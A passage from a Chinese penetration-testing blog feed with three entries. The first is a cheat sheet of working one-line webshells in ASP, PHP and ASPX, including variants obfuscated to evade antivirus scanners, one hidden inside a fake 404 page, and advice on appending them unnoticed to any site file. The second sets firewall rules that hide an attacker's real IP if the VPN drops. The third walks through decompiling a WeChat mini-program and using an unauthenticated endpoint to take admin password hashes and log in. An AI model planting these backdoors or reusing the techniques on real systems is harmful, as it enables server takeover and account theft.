&quot;&lt;/form&gt;&quot;</span><br><span class="line">&lt;/Script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ASP一句话:&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt;</span><br><span class="line"></span><br><span class="line">PHP防杀放扫 一句话：&lt;?php (])?&gt;</span><br><span class="line">上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如</span><br><span class="line">index.asp里面也是可以的！</span><br><span class="line"></span><br><span class="line">因为加了判断！加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件</span><br><span class="line">的最底部不会出错！&lt;?if(isset($_POST[&#x27;1&#x27;]))&#123;eval($_POST[&#x27;1&#x27;]);&#125;?&gt;&lt;?php system($_REQUEST[1]);?&gt;</span><br><span class="line"></span><br><span class="line">无防下载表，有防下载表可尝试插入以下语句突破的一句话</span><br><span class="line">&lt;%execute request(“class”)%&gt;&lt;%&#x27;&lt;% loop &lt;%:%&gt;&lt;%&#x27;&lt;% loop &lt;%:%&gt;&lt;%execute request(“class”)%&gt;&lt;%execute request(“class”)&#x27;&lt;% loop &lt;%:%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">备份专用&lt;%eval(request(“1″)):response.end%&gt;</span><br><span class="line">asp一句话&lt;%execute(request(“1″))%&gt;</span><br><span class="line">aspx一句话:&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y(“add6bb58e139be10″);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">可以躲过雷客图的一句话。</span><br><span class="line">&lt;%set ms = server.CreateObject(“MSScriptControl.ScriptControl.1″)</span><br><span class="line">ms.Language=”VBScript”ms.AddObject”Response”,Responsems.AddObject”request”,</span><br><span class="line">requestms.ExecuteStatement(“ev”&amp;”al(request(“”1″”))”)%&gt;</span><br><span class="line"></span><br><span class="line">不用&#x27;&lt;,&gt;‘的asp一句话&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">不用双引号的一句话。&lt;%eval request(chr(35))%&gt;</span><br></pre></td></tr></table></figure>


<hr>
<p>版权声明：本文为CSDN博主「冰 河」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/l1028386804/article/details/84206143">https://blog.csdn.net/l1028386804/article/details/84206143</a></p>
<hr>
<h1 id="常见的一句话木马"><a href="#常见的一句话木马" class="headerlink" title="常见的一句话木马"></a><a href="https://www.cnblogs.com/goodgad/p/13463866.html">常见的一句话木马</a></h1><p>1、普通一句话：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[123456]);?&gt;</span><br></pre></td></tr></table></figure>

<p>*post后面中括号里面的内容是使用菜刀或蚁剑连接时的密码</p>
<p>2、防爆破一句话：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php``substr(md5($_REQUEST[``&#x27;x&#x27;``]),28)==``&#x27;6862&#x27;``&amp;&amp;``eval``($_REQUEST[``&#x27;password&#x27;``]);``?&gt;``*菜刀地址http:``//192``.168.64.137``/x``.php?x=myh0st</span><br></pre></td></tr></table></figure>

<p>3、过狗一句话:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php                                      ?&gt; ``//``菜刀地址 http:``//localhost/1``.php?s=assert``&lt;php $a = ``&quot;a&quot;``.``&quot;s&quot;``.``&quot;s&quot;``.``&quot;e&quot;``.``&quot;r&quot;``.``&quot;t&quot;``; $a($_POST[hihack]);``?&gt;</span><br></pre></td></tr></table></figure>

<p>4、404隐藏的一句话：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC ``&quot;-//IETF//DTD HTML 2.0//EN&quot;``&gt;``&lt;html&gt;&lt;``head``&gt;``&lt;title&gt;404 Not Found&lt;``/title``&gt;``&lt;``/head``&gt;&lt;body&gt;``&lt;h1&gt;Not Found&lt;``/h1``&gt;``&lt;p&gt;The requested URL ``/error``.php was not found on this server. &lt;``/p``&gt;``&lt;``/body``&gt;&lt;``/html``&gt;``&lt;?php``@preg_replace(``&quot;/[checksql]/e&quot;``,$_POST[``&#x27;hihack&#x27;``],``&quot;saft&quot;``);``?&gt;</span><br></pre></td></tr></table></figure>

<p>菜刀连接时在配置栏添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;O&gt;``date``=@``eval``($_POST[paxmac]);&lt;``/O``&gt;</span><br></pre></td></tr></table></figure>

<p>5、不用问号(?)的一句话：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=``&quot;php&quot;``&gt;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>5、不用双引号(“)的一句话：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%``eval` `request(chr(35))%&gt; 密码：``#</span><br></pre></td></tr></table></figure>

<p>ASPX一句话：</p>
<p>1、普通一句话：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=”Jscript”%&gt; &lt;%                                              %&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>强制通过VPN上网，VPN断线就断开</title>
    <url>/posts/f6240f8d.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>细节决定成败，一失足成千古恨。</p>
<p>在渗透测试过程中，我们一般通过 VPN 代理来进行渗透，但是如果 VPN 突然断线了，那么就很可能使用我们的真实 IP 来对目标进行渗透，哪天可能就会被请去喝茶了。</p>
<p>要解决这种麻烦情况，最好是设置所有流量<strong>只能通过VPN</strong>出去，一旦VPN断线流量<strong>无法通过本地网络</strong>出去。经过测试，利用系统自带的防火墙就可以达到这个目的，Windows用自带的防火墙即可，Linux可使用iptables进行设置。</p>
<h2 id="0x01-Linux-设置"><a href="#0x01-Linux-设置" class="headerlink" title="0x01 Linux 设置"></a>0x01 Linux 设置</h2><h3 id="允许通向VPN服务器的流量"><a href="#允许通向VPN服务器的流量" class="headerlink" title="允许通向VPN服务器的流量"></a>允许通向VPN服务器的流量</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A OUTPUT -d 14.14.14.14 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -d 14.14.14.15 -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>14.14.14.14和14.14.14.15即为VPN服务器的地址</p>
<h3 id="允许流量通过vpn链接出去"><a href="#允许流量通过vpn链接出去" class="headerlink" title="允许流量通过vpn链接出去"></a>允许流量通过vpn链接出去</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A OUTPUT -o ppp0 -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>其中ppp0为VPN拨号成功后，新建的本地虚拟网卡，我测试用的l2tp协议，如果是其他协议，名字可能不同，可能是tun0</p>
<h3 id="阻止所有出口流量"><a href="#阻止所有出口流量" class="headerlink" title="阻止所有出口流量"></a>阻止所有出口流量</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A OUTPUT -j DROP</span><br></pre></td></tr></table></figure>

<p>禁止所有出口流量</p>
<p>综合起来iptables命令即为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -A OUTPUT -d 14.14.14.14 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -d 14.14.14.15 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -o ppp0 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -j DROP</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-F, --flush [chain] 清空指定链 chain 上面的所有规则。如果没有指定链，清空该表上所有链的所有规则。</span><br><span class="line">-X, --delete-chain [chain] ：删除指定的链，这个链必须没有被其它任何规则引用，而且这条上必须没有任何规则。如果没有指定链名，则会删除该表中所有非内置的链。</span><br><span class="line">-A, --append chain rule-specification 在指定链 chain 的末尾插入指定的规则，也就是说，这条规则会被放到最后，最后才会被执行。规则是由后面的匹配来指定。</span><br><span class="line">-d, --destination [!] address[/mask] ：地址格式同上，但这里是指定地址为目的地址，按此进行过滤。</span><br><span class="line">-j, --jump target &lt;指定目标&gt; ：即满足某条件时该执行什么样的动作。target 可以是内置的目标，比如 ACCEPT，也可以是用户自定义的链。</span><br><span class="line">-o, --out-interface [!] &lt;网络接口name&gt; ：指定数据包出去的网络接口。只对 OUTPUT，FORWARD，POSTROUTING 三个链起作用。</span><br></pre></td></tr></table></figure>

<h3 id="取消防火墙规则"><a href="#取消防火墙规则" class="headerlink" title="取消防火墙规则"></a>取消防火墙规则</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br></pre></td></tr></table></figure>

<h2 id="0x02-Windows防火墙设置"><a href="#0x02-Windows防火墙设置" class="headerlink" title="0x02 Windows防火墙设置"></a>0x02 Windows防火墙设置</h2><p>需要分三步对防火墙进行设置：</p>
<ol>
<li>默认阻止所有出口流量</li>
<li>在本地连接上设置允许通向VPN服务器的出口流量</li>
<li>允许所有流量通过vpn链接出去</li>
</ol>
<h3 id="阻止所有出口流量-1"><a href="#阻止所有出口流量-1" class="headerlink" title="阻止所有出口流量"></a>阻止所有出口流量</h3><p><strong>win10</strong></p>
<p><code>win</code>+<code>r</code> ，输入 <code>wf.msc</code> ，右键 <code>出站规则</code>  –&gt; <code>新建规则</code></p>
<p>选择 <code>自定义</code>，一般默认自定义为禁止所有出站流量，设置名称保存即可。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/强制通过VPN上网，VPN断线就断开/image-20220411112342782.png" alt="image-20220411112342782" style="zoom: 33%;" />

<h3 id="允许通向VPN服务器的流量-1"><a href="#允许通向VPN服务器的流量-1" class="headerlink" title="允许通向VPN服务器的流量"></a>允许通向VPN服务器的流量</h3><p>和上一步一样，选择自定义，在作用域那么设置应用于哪些远程 ip 地址</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/强制通过VPN上网，VPN断线就断开/image-20220411113558878.png" alt="image-20220411113558878" style="zoom: 50%;" />

<p>在操作那里选择 <code>允许连接</code></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/强制通过VPN上网，VPN断线就断开/image-20220411113712867.png" alt="image-20220411113712867" style="zoom:50%;" />

<p>设置名称保存即可。</p>
<h3 id="允许流量通过vpn链接出去-1"><a href="#允许流量通过vpn链接出去-1" class="headerlink" title="允许流量通过vpn链接出去"></a>允许流量通过vpn链接出去</h3><p>与上一步类似，新建出站规则，在作用域页面，IP地址设置保持默认不变。然后选择自定义：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/强制通过VPN上网，VPN断线就断开/image-20220411114124238.png" alt="image-20220411114124238" style="zoom:50%;" />

<p>设置名称，保存即可。</p>
<h3 id="bat-脚本"><a href="#bat-脚本" class="headerlink" title="bat 脚本"></a>bat 脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">TITLE Set forced through the VPN to the Internet, plz run as administrator! by t00ls.net</span><br><span class="line">:menu</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> ========================================================================</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> 1. Set forced through the VPN to Internet , plz run as administrator</span><br><span class="line"><span class="built_in">echo</span> 2. Delete your settings <span class="keyword">in</span> 1 , plz run administrator</span><br><span class="line"><span class="built_in">echo</span> 3. Query your settings IP</span><br><span class="line"><span class="built_in">echo</span> 4. <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">echo</span>.                                                                 </span><br><span class="line"><span class="built_in">echo</span> by t00ls.net                                               </span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">set</span> /p select=plz select:</span><br><span class="line"><span class="keyword">if</span> /i <span class="string">&quot;%select%&quot;</span>==<span class="string">&quot;1&quot;</span> goto 1</span><br><span class="line"><span class="keyword">if</span> /i <span class="string">&quot;%select%&quot;</span>==<span class="string">&quot;2&quot;</span> goto 2</span><br><span class="line"><span class="keyword">if</span> /i <span class="string">&quot;%select%&quot;</span>==<span class="string">&quot;3&quot;</span> goto 3</span><br><span class="line"><span class="keyword">if</span> /i <span class="string">&quot;%select%&quot;</span>==<span class="string">&quot;4&quot;</span> goto 4</span><br><span class="line"><span class="built_in">echo</span> error select&amp;pause&amp;%0</span><br><span class="line">:1</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> Examples:</span><br><span class="line"><span class="built_in">echo</span> 		10.0.0.1 or 10.0.0.1-10.0.0.254 or 10.0.0.1/24</span><br><span class="line"><span class="built_in">echo</span> 		10.0.0.1,192.168.1.1,10.10.10.0/24</span><br><span class="line"><span class="built_in">echo</span> 		use , to separate multiple IPs</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">set</span> /p ip=Set Your IP Address:</span><br><span class="line"><span class="built_in">echo</span> netsh advfirewall <span class="built_in">set</span> allprofiles firewallpolicy allowinbound,blockout bound</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles firewallpolicy allowinbound,blockoutbound</span><br><span class="line"><span class="built_in">echo</span> netsh advfirewall firewall add rule name=<span class="string">&quot;allowvpn1&quot;</span> <span class="built_in">dir</span> out action=allow <span class="built_in">enable</span>=<span class="built_in">yes</span> remoteip=<span class="string">&quot;%ip%&quot;</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;allowvpn1&quot;</span> <span class="built_in">dir</span>=out action=allow <span class="built_in">enable</span>=<span class="built_in">yes</span> remoteip=<span class="string">&quot;%ip%&quot;</span></span><br><span class="line"><span class="built_in">echo</span> netsh advfirewall firewall add rule name=<span class="string">&quot;allowvpnremote1&quot;</span> <span class="built_in">dir</span>=out action=allow <span class="built_in">enable</span>=<span class="built_in">yes</span> interfacetype=ras</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;allowvpnremote1&quot;</span> <span class="built_in">dir</span>=out action=allow <span class="built_in">enable</span>=<span class="built_in">yes</span> interfacetype=ras</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:2</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> netsh advfirewall <span class="built_in">set</span> allprofiles firewallpolicy allowinbound,allowoutbound</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles firewallpolicy allowinbound,allowoutbound</span><br><span class="line"><span class="built_in">echo</span> netsh advfirewall firewall delete rule name=<span class="string">&quot;allowvpn1&quot;</span></span><br><span class="line">netsh advfirewall firewall delete rule name=<span class="string">&quot;allowvpn1&quot;</span></span><br><span class="line"><span class="built_in">echo</span> netsh advfirewall firewall delete rule name=<span class="string">&quot;allowvpnremote1&quot;</span></span><br><span class="line">netsh advfirewall firewall delete rule name=<span class="string">&quot;allowvpnremote1&quot;</span></span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:3</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> You have <span class="built_in">set</span> the IP</span><br><span class="line">netsh advfirewall firewall show rule name=<span class="string">&quot;allowvpn1&quot;</span>|findstr IP</span><br><span class="line"><span class="keyword">if</span> %errorlevel% NEQ 0 (<span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> ----Not Found IP----</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.) <span class="keyword">else</span> <span class="built_in">echo</span>.</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:4</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>



<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>Windows 不同操作系统可能配置步骤不一样，但思路总体是这样。</p>
<p>经过设置之后，就不用害怕 VPN 突然断开了。</p>
<h2 id="0x04参考链接："><a href="#0x04参考链接：" class="headerlink" title="0x04参考链接："></a>0x04参考链接：</h2><p><a href="https://www.t00ls.net/thread-38739-1-1.html">https://www.t00ls.net/thread-38739-1-1.html</a></p>
<p><a href="http://cn-sec.com/archives/349773.html">http://cn-sec.com/archives/349773.html</a></p>
<p><a href="https://xz.aliyun.com/t/1117">https://xz.aliyun.com/t/1117</a></p>
]]></content>
      <categories>
        <category>隐匿技术</category>
      </categories>
      <tags>
        <tag>流量隐藏技术</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序渗透</title>
    <url>/posts/4fac5a8f.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><blockquote>
<p>原文章：<a href="https://forum.butian.net/share/1227">https://forum.butian.net/share/1227</a></p>
</blockquote>
<p>这篇文章在上面的文章的基础上做了一些补充，新增了一种更加方便快捷的反编译微信小程序方法和快速查找信息泄露和未授权接口的方法。</p>
<p>算是二创了吧，如果大家有更好的想法也可以提出来，尽善尽美。</p>
<p>请享受你的微信小程序渗透之旅。</p>
<hr>
<blockquote>
<p>2022&#x2F;10&#x2F;03补充：</p>
<p>微信小程序信息在线收集，wxapkg源码包内提取信息：</p>
<p><a href="https://github.com/moyuwa/wechat_appinfo_wxapkg">https://github.com/moyuwa/wechat_appinfo_wxapkg</a></p>
<p>一篇非常优秀的微信小程序渗透文章：</p>
<p><a href="https://www.hackinn.com/index.php/archives/672/">https://www.hackinn.com/index.php/archives/672/</a></p>
</blockquote>
<h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><blockquote>
<p>个人更加推荐使用模拟器作为抓包方式，而其中使用低版本的模拟器和低版本的微信绝对会让你的抓包之旅更加愉悦。</p>
</blockquote>
<p>使用的是<code>6.6.1.1</code> 版本的夜神模拟器，内设系统为 <code>android 5.0</code> ，比较容易抓取 <code>https</code> 包。</p>
<p>使用 <code>ipconfig</code> 查看 模拟器的 ip 地址。</p>
<p>在连接 wifi 的情况下，网卡为 <code>VirtualBox Host-Only Network #xx</code></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/微信小程序渗透/image-20220331222726922.png" alt="image-20220331222726922" style="zoom: 67%;" />

<p>在使用网卡连接的情况下，</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/微信小程序渗透/image-20220331222908698.png" alt="image-20220331222908698" style="zoom:67%;" />

<p>在 <code>burpsuite</code> 上设置代理：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/微信小程序渗透/image-20220331223259954.png" alt="image-20220331223259954" style="zoom: 33%;" />

<p>然后夜神模拟器设置代理，点击左上角——&gt;添加网络，然后填入 <code>WiredSSID</code>，点击高级选项，设置的代理 <code>ip</code> 和 <code>port</code> 和<code>burpsuite</code> 对应即可</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/微信小程序渗透/image-20220331224148680.png" alt="image-20220331224148680" style="zoom: 33%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/微信小程序渗透/image-20220331224344902.png" alt="image-20220331224344902" style="zoom: 33%;" />

<p>，直接打开浏览器访问 <code>192.168.56.1:8889</code> ，下载证书</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20220331224640319.png" alt="image-20220331224640319"></p>
<p>打开文件管理器，在<code>sdcard-&gt;Download</code>目录中可以看到下载下来的证书</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/微信小程序渗透/image-20220331224822198.png" alt="image-20220331224822198" style="zoom: 33%;" />

<p>将<code>cacert.der</code>更名为<code>cacert.cer</code>，也就是将后缀改成<code>cer</code></p>
<blockquote>
<p>更改文件名可以按 crtl + 4 打开文件管理器，点击打开电脑文件夹，进入 download ，在电脑上进行更改</p>
</blockquote>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/微信小程序渗透/image-20220331225206798.png" alt="image-20220331225206798" style="zoom: 50%;" />

<p>然后到手机设置-&gt;安全中，选择从 SD 卡安装。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/微信小程序渗透/image-20220331225339540.png" alt="image-20220331225339540" style="zoom: 25%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/微信小程序渗透/image-20220331225417431.png" alt="image-20220331225417431" style="zoom: 33%;" />

<p>安装证书</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/微信小程序渗透/image-20220331225459155.png" alt="image-20220331225459155" style="zoom:33%;" />

<p>测试一下，浏览器访问百度，burpsuite 能正常抓包说明已经设置环境成功</p>
<p>然后可以下载 微信 8.0 版本。</p>
<div class="note warning simple"><p>有些小程序无法通过下拉面板进入，提示微信版本过低，这时可以通过搜索小程序的名字进入。</p>
</div>

<h2 id="0x02-反编译微信小程序代码"><a href="#0x02-反编译微信小程序代码" class="headerlink" title="0x02 反编译微信小程序代码"></a>0x02 反编译微信小程序代码</h2><h3 id="1-批量PC端反编译（个人补充）"><a href="#1-批量PC端反编译（个人补充）" class="headerlink" title="1. 批量PC端反编译（个人补充）"></a>1. 批量PC端反编译（个人补充）</h3><p>项目地址：<a href="https://github.com/DC3x6/Unpack">https://github.com/DC3x6/Unpack</a></p>
<blockquote>
<p>好评</p>
</blockquote>
<h3 id="2-手工反编译"><a href="#2-手工反编译" class="headerlink" title="2. 手工反编译"></a>2. 手工反编译</h3><p>我们在模拟器里登录微信，然后随便选择一个微信小程序打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640.png" alt="图片"></p>
<p>打开文件管理器，在<code>data/data/com.tencent.mm/MicroMsg</code>会生成一个md5加密命名的文件夹（如果打开微信小程序过多，同时有多个文件夹不容易识别的情况，可以选择把<code>MicroMsg</code>文件夹所有内容删除掉，再去重新打开微信小程序，就会得到唯一一个MD5加密命名的文件夹啦）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214971.png" alt="图片"></p>
<p>在该文件夹下的<code>appbrand/pkg</code>目录下找到<code>.wxapkg</code>后缀结尾的文件，其中只有几MB大小的为刚刚打开的小程序的文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214972.png" alt="图片"></p>
<p>点击勾选之后，来到根目录下的<code>mnt/shared/App</code>目录，打开右上角三个<code>.</code>的功能菜单选择粘贴选择项，将文件复制到该文件夹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214973.png" alt="图片"></p>
<p>这里的文件夹就是电脑共享的文件夹，点击打开电脑文件夹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214984.png" alt="图片"></p>
<p>可以找到小程序的文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214985.png" alt="图片"></p>
<p>这里推荐有 GUI 界面的反编译工具：<a href="https://github.com/ezshine/wxapkg-convertor/releases">https://github.com/ezshine/wxapkg-convertor/releases</a></p>
<p>直接将文件鼠标拖拽到 GUI 界面即可开始反编译，在拖入文件的当前目录得到反编译生成的文件夹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214986.png" alt="图片"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214987.png" alt="图片"></p>
<p>然后就可以开始舒服的看看 js 代码啦</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214988.png" alt="图片"></p>
<h2 id="0x03-反编译源码代码审计"><a href="#0x03-反编译源码代码审计" class="headerlink" title="0x03 反编译源码代码审计"></a>0x03 反编译源码代码审计</h2><p>举例某小程序审计，在登录界面爆破无关之后，直接反编译拖源码审计一下，反编译出来的源码，我们着重看 js 文件及其配置文件即可。第一想法就是先找一些接口，尝试是否有未授权之类的漏洞，下面就是找到的一处路由<code>user/getUserInfoByUsername</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214989.png" alt="图片"></p>
<p>可以看到发送数据类型为 json 格式，并且参数为<code>username</code>和<code>school</code>，于是尝试构造请求发送</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149810.png" alt="图片"></p>
<p>成功获取系统管理员详细信息，其中包括关键的密码。获取到 md5 加密形式的密码密文后，本来还想去 cmd5 去解一下， 但是接下来注意到一个登录路由<code>user/loginByUsernameAndPassword</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149811.png" alt="图片"></p>
<p>从源码中都看得出来就是通过账号密码去登录，刚刚未授权得到的密码存储为 md5 加密形式，想来登录应该也是进行 md5 加密的形式，所以直接发送加密形式的密码即可，构造请求发送</p>
